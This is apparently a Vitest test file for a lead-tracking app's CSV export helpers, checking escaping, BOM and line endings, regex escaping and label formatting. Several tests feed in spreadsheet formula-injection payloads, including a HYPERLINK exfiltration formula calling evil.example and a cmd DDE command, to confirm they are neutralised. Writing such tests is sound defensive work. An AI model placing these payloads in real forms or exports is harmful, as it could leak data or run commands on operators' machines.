import { describe, expect, it } from "vitest";
import {
  LEAD_KIND_LABELS,
  LEAD_STATUSES,
  LEAD_STATUS_LABELS,
  csvEscape,
  escapeRegExp,
  humanizeFieldKey,
  toCsv,
  type LeadSummary,
} from "@/lib/leads/display";

/**
 * Undoes CSV field quoting, the way a spreadsheet would.
 *
 * Lets the injection tests assert on the value a spreadsheet actually receives
 * rather than on the encoded text, which is where the real risk lives.
 */
function parseCsvField(field: string): string {
  if (!field.startsWith('"')) return field;
  return field.slice(1, -1).replace(/""/g, '"');
}

function lead(overrides: Partial<LeadSummary> = {}): LeadSummary {
  return {
    id: "6a662ba0e453bdd310d2fa53",
    kind: "enquiry",
    reference: "BC-ABC123",
    name: "Ada Lovelace",
    email: "ada@example.com",
    company: "Analytical Engines",
    summary: "We need a booking system.",
    status: "new",
    budget: "$5k-10k",
    source: "contact-form",
    noteCount: 0,
    assignedToId: null,
    createdAt: new Date("2026-07-26T10:30:00.000Z"),
    score: null,
    ...overrides,
  };
}

describe("csvEscape", () => {
  it("passes ordinary text through", () => {
    expect(csvEscape("Ada Lovelace")).toBe("Ada Lovelace");
  });

  it("quotes and doubles embedded quotes", () => {
    expect(csvEscape('He said "hello"')).toBe('"He said ""hello"""');
  });

  it("quotes values containing a comma or semicolon", () => {
    expect(csvEscape("Ahmedabad, Gujarat")).toBe('"Ahmedabad, Gujarat"');
    expect(csvEscape("a;b")).toBe('"a;b"');
  });

  it("flattens newlines and tabs so a row cannot be split", () => {
    // A message with a newline would otherwise become two CSV rows, silently
    // corrupting every column after it.
    expect(csvEscape("line one\nline two")).toBe("line one line two");
    expect(csvEscape("a\r\nb")).toBe("a b");
    expect(csvEscape("a\tb")).toBe("a b");
  });

  it("neutralises spreadsheet formula injection", () => {
    // These arrive from a public form. Opened in Excel or Sheets, a leading
    // `=`, `+`, `-`, or `@` is executed — a real path from a web form into the
    // operator's machine.
    expect(csvEscape("=1+1")).toBe("'=1+1");
    expect(csvEscape("+1234")).toBe("'+1234");
    expect(csvEscape("-1234")).toBe("'-1234");
    expect(csvEscape("@SUM(A1)")).toBe("'@SUM(A1)");
  });

  it("neutralises the classic exfiltration payload", () => {
    // This payload contains a comma, so it is also CSV-quoted. Asserting on the
    // raw text would therefore be misleading — what matters is the value a
    // spreadsheet ends up with *after* it unquotes the field. The guard
    // character has to survive that step, which means it must be applied before
    // quoting, not after.
    const payload = '=HYPERLINK("http://evil.example/?"&A1,"Click")';
    const escaped = csvEscape(payload);

    expect(escaped.startsWith('"')).toBe(true);
    expect(parseCsvField(escaped).startsWith("'=")).toBe(true);
  });

  it("does not mangle a value that merely contains an equals sign", () => {
    expect(csvEscape("width=device-width")).toBe("width=device-width");
  });

  it("renders dates as ISO strings", () => {
    expect(csvEscape(new Date("2026-07-26T10:30:00.000Z"))).toBe(
      "2026-07-26T10:30:00.000Z",
    );
  });

  it("renders null and undefined as empty", () => {
    expect(csvEscape(null)).toBe("");
    expect(csvEscape(undefined)).toBe("");
  });

  it("renders zero as zero, not as empty", () => {
    // A score of 0 is meaningful; treating it as missing would hide the worst
    // audits from the export.
    expect(csvEscape(0)).toBe("0");
  });
});

describe("toCsv", () => {
  it("emits a header row and one row per lead", () => {
    const csv = toCsv([lead(), lead({ reference: "BC-DEF456" })]);
    const lines = csv.replace(/^﻿/, "").trimEnd().split("\r\n");
    expect(lines).toHaveLength(3);
    expect(lines[0]).toBe(
      "reference,kind,status,name,email,company,budget,source,score,createdAt,summary",
    );
    expect(lines[1]).toContain("BC-ABC123");
    expect(lines[2]).toContain("BC-DEF456");
  });

  it("starts with a UTF-8 BOM so Excel reads accents correctly", () => {
    expect(toCsv([lead({ company: "Café Rossi" })].slice()).charCodeAt(0)).toBe(
      0xfeff,
    );
    expect(toCsv([lead({ company: "Café Rossi" })])).toContain("Café Rossi");
  });

  it("uses CRLF line endings", () => {
    expect(toCsv([lead()])).toContain("\r\n");
  });

  it("emits a header-only file for no leads", () => {
    const csv = toCsv([]);
    expect(csv.replace(/^﻿/, "").trimEnd().split("\r\n")).toHaveLength(1);
  });

  it("keeps a multi-line message on one row", () => {
    const csv = toCsv([lead({ summary: "first\nsecond\nthird" })]);
    expect(csv.replace(/^﻿/, "").trimEnd().split("\r\n")).toHaveLength(2);
  });

  it("carries an injected formula through neutralised", () => {
    const csv = toCsv([lead({ name: "=cmd|'/c calc'!A1" })]);
    expect(csv).toContain("'=cmd");
  });
});

describe("escapeRegExp", () => {
  it("escapes every metacharacter the search box might receive", () => {
    expect(escapeRegExp("c++ (x)")).toBe("c\\+\\+ \\(x\\)");
    expect(new RegExp(escapeRegExp(".*")).test("anything")).toBe(false);
    expect(new RegExp(escapeRegExp(".*")).test("a.*b")).toBe(true);
  });
});

describe("label coverage", () => {
  it("labels every lead status", () => {
    for (const status of LEAD_STATUSES) {
      expect(LEAD_STATUS_LABELS[status], status).toBeTruthy();
    }
    expect(Object.keys(LEAD_STATUS_LABELS)).toHaveLength(LEAD_STATUSES.length);
  });

  it("labels every lead source", () => {
    expect(LEAD_KIND_LABELS.enquiry).toBeTruthy();
    expect(LEAD_KIND_LABELS.consultant).toBeTruthy();
    expect(LEAD_KIND_LABELS.audit).toBeTruthy();
  });
});

describe("humanizeFieldKey", () => {
  it("renders camelCase as sentence case", () => {
    expect(humanizeFieldKey("projectType")).toBe("Project type");
    expect(humanizeFieldKey("preferredStartDate")).toBe("Preferred start date");
  });

  it("preserves acronyms", () => {
    // Lowercasing every word after the first would mangle these.
    expect(humanizeFieldKey("totalUSD")).toBe("Total USD");
    expect(humanizeFieldKey("needsSEO")).toBe("Needs SEO");
    expect(humanizeFieldKey("apiVersion")).toBe("Api version");
  });

  it("handles snake and kebab case", () => {
    expect(humanizeFieldKey("project_type")).toBe("Project type");
    expect(humanizeFieldKey("project-type")).toBe("Project type");
    expect(humanizeFieldKey("project__type")).toBe("Project type");
  });

  it("handles a single word and a leading acronym", () => {
    expect(humanizeFieldKey("budget")).toBe("Budget");
    expect(humanizeFieldKey("USD")).toBe("USD");
  });

  it("returns empty for empty input", () => {
    expect(humanizeFieldKey("")).toBe("");
    expect(humanizeFieldKey("__")).toBe("");
  });
});
